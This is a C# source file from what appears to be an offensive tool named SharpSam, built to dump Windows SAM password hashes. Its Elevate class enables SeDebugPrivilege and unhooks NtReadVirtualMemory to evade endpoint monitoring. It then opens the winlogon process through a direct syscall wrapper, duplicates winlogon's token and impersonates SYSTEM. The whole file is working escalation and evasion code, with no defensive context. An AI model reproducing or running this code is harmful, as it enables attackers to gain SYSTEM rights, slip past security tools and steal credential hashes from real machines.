using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using static SharpSam.Token;

namespace SharpSam
{
    internal class Elevate
    {

        public enum NTSTATUS : uint
        {
            Success = 0x00000000,
            InvalidHandle = 0xC0000008,
            AccessDenied = 0xC0000022,
            NotImplemented = 0xC0000002,
            InvalidParameter = 0xC000000D,
            NoMemory = 0xC0000017,
            ObjectNameNotFound = 0xC0000034,
            ObjectPathNotFound = 0xC000003A,
            BadImpersonationLevel = 0xC00000A5,
            InternalError = 0xC00000E5,
            UnknownError = 0xFFFFFFFF
        }

        public static bool SetDebugPrivilege()
        {
            string Privilege = "SeDebugPrivilege";
            IntPtr hToken = Utils.GetCurrentProcessToken();
            Native.LUID luid = new Native.LUID();
            if (!Native.LookupPrivilegeValue(null, Privilege, ref luid))
            {
                Console.WriteLine("Error LookupPrivilegeValue" + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }

            Native.LUID_AND_ATTRIBUTES luidAndAttributes = new Native.LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = Native.SE_PRIVILEGE_ENABLED;

            Native.TOKEN_PRIVILEGES newState = new Native.TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            Native.TOKEN_PRIVILEGES previousState = new Native.TOKEN_PRIVILEGES();
            UInt32 returnLength = 0;
            if (!Native.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
            {
                Console.WriteLine("AdjustTokenPrivileges() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }
            Console.WriteLine("[*] AdjustTokenPrivileges!!");
            return true;
        }

        public static bool ToSYSTEM()
        {
            if (SetDebugPrivilege())
            {
                IntPtr phNewToken = DuplicateSystem();
                if (phNewToken != IntPtr.Zero)
                {
                    Console.WriteLine("[*] SYSTEM token duplicated");
                    WindowsIdentity windowsIdentity = new WindowsIdentity(phNewToken);
                    WindowsImpersonationContext impersonationContext = windowsIdentity.Impersonate();

                    if (impersonationContext == null)
                    {
                        Native.CloseHandle(phNewToken);
                        impersonationContext.Dispose();
                        Console.WriteLine("[*] failed to impersonate system. Get hashed sam key /: ");
                        return false;
                    }
                    Console.WriteLine("[*] Impersonated SYSTEM");
                    return true;
                }
                else
                {
                    Console.WriteLine($"Couldn't duplicate SYSTEM token!!");
                    Native.CloseHandle(phNewToken);
                    return false;
                }
            }
            else
            {
                Console.WriteLine($"Couldn't enable privs!!");
                return false;
            }
        }

        public static IntPtr DuplicateSystem()
        {
            IntPtr hToken;
            IntPtr phNewToken;

            var lpTokenAttributes = new SECURITY_ATTRIBUTES();

            Native.OBJECT_ATTRIBUTES objAttribute = new Native.OBJECT_ATTRIBUTES();

            Native.WIN_VER_INFO pWinVerInfo = new Native.WIN_VER_INFO();
            Native.OSVERSIONINFOEXW osInfo = new Native.OSVERSIONINFOEXW();
            osInfo.dwOSVersionInfoSize = Marshal.SizeOf(osInfo);
            pWinVerInfo.chOSMajorMinor = osInfo.dwMajorVersion + "." + osInfo.dwMinorVersion;
            pWinVerInfo.SystemCall = 0x3F;

            var _hProcess = Process.GetProcessesByName("winlogon")[0].Id;

            var hProcess = (IntPtr)Process.GetProcessesByName("winlogon")[0].Id;
            pWinVerInfo.hTargetPID = (IntPtr)Process.GetProcessesByName("winlogon")[0].Id;

            pWinVerInfo.lpApiCall = "NtReadVirtualMemory";

            if (!Utils.UnHookNativeApi(pWinVerInfo))
            {
                Console.WriteLine("[x] error unhooking {0}", pWinVerInfo.lpApiCall);
                return IntPtr.Zero;
            }


            Native.CLIENT_ID clientid = new Native.CLIENT_ID();
            clientid.UniqueProcess = pWinVerInfo.hTargetPID;
            clientid.UniqueThread = IntPtr.Zero;


            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            var siL = new SECURITY_IMPERSONATION_LEVEL();

            Native.RtlInitUnicodeString(ref pWinVerInfo.ProcName, "winlogon.exe");
            var status = Sys.ZwOpenProcess10(ref hProcess, Native.ProcessAccessFlags.All, objAttribute, ref clientid);

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[x] Error ZwOpenProcess10  " + status);
                Console.WriteLine("ZwOpenProcess10: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                Native.CloseHandle(hProcess);
                return IntPtr.Zero;
            }
            Console.WriteLine("[*] ZwOpenProcess10: " + status);

            if (Native.OpenProcessToken(hProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, out hToken))
            {
                if (DuplicateTokenEx(
                    hToken, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, ref lpTokenAttributes, siL, TOKEN_ASSIGN_PRIMARY, out phNewToken))
                {
                    return phNewToken;
                }
                else
                {
                    return IntPtr.Zero;
                }
            }
            return IntPtr.Zero;
        }

        public static NTSTATUS do_systemImpersonate(IntPtr phNewToken)
        {
            IntPtr hToken;
            var lpTokenAttributes = new SECURITY_ATTRIBUTES();

            Native.OBJECT_ATTRIBUTES objAttribute = new Native.OBJECT_ATTRIBUTES();
            Native.WIN_VER_INFO pWinVerInfo = new Native.WIN_VER_INFO();
            Native.OSVERSIONINFOEXW osInfo = new Native.OSVERSIONINFOEXW();
            osInfo.dwOSVersionInfoSize = Marshal.SizeOf(osInfo);
            pWinVerInfo.chOSMajorMinor = osInfo.dwMajorVersion + "." + osInfo.dwMinorVersion;
            pWinVerInfo.SystemCall = 0x3F;

            var _hProcess = Process.GetProcessesByName("winlogon")[0].Id;

            var hProcess = (IntPtr)Process.GetProcessesByName("winlogon")[0].Id;
            pWinVerInfo.hTargetPID = (IntPtr)Process.GetProcessesByName("winlogon")[0].Id;

            pWinVerInfo.lpApiCall = "NtReadVirtualMemory";

            if (!Utils.UnHookNativeApi(pWinVerInfo))
            {
                Console.WriteLine("[x] error unhooking {0}", pWinVerInfo.lpApiCall);
                return NTSTATUS.UnknownError;
            }

            Native.CLIENT_ID clientid = new Native.CLIENT_ID();
            clientid.UniqueProcess = pWinVerInfo.hTargetPID;
            clientid.UniqueThread = IntPtr.Zero;


            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            var siL = new SECURITY_IMPERSONATION_LEVEL();

            Console.WriteLine("[*] _hProcess: " + _hProcess);

            Native.RtlInitUnicodeString(ref pWinVerInfo.ProcName, "winlogon.exe");
            var status = Sys.ZwOpenProcess10(ref hProcess, Native.ProcessAccessFlags.All, objAttribute, ref clientid);

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[x] Error ZwOpenProcess10  " + status);
                Console.WriteLine("ZwOpenProcess10: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                Native.CloseHandle(hProcess);
                return NTSTATUS.InternalError;
            }
            Console.WriteLine("[*] ZwOpenProcess10: " + status);

            if (Native.OpenProcessToken(hProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, out hToken))
            {
                if (DuplicateTokenEx(
                    hToken, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, ref lpTokenAttributes, siL, TOKEN_ASSIGN_PRIMARY, out phNewToken))
                {
                    Console.WriteLine("[*] token DUPLICATED ");

                    // chatgpt once again
                    WindowsIdentity windowsIdentity = new WindowsIdentity(phNewToken);
                    WindowsImpersonationContext impersonationContext = windowsIdentity.Impersonate();

                    NTSTATUS result = (NTSTATUS)Marshal.GetLastWin32Error();
                    if (result != NTSTATUS.Success)
                    {
                        Console.WriteLine($"Failed to impersonate SYSTEM user: {result}");
                        windowsIdentity.Dispose();
                        Native.CloseHandle(phNewToken);
                        Native.CloseHandle(hToken);
                        Native.CloseHandle(hProcess);
                        return result;
                    }
                    else
                    {
                        Console.WriteLine("[*] Impersonated SYSTEM user successfully");
                        return result;
                    }
                }
                else
                {
                    Console.WriteLine("Error DuplicateTokenEx: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                    Native.CloseHandle(phNewToken);
                    Native.CloseHandle(hToken);
                    Native.CloseHandle(hProcess);
                    return NTSTATUS.NotImplemented;
                }
            }
            else
            {
                Console.WriteLine("Error OpenProcessToken: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                Native.CloseHandle(hToken);
                Native.CloseHandle(hProcess);
                return NTSTATUS.NotImplemented;
            }
        }
    }
}
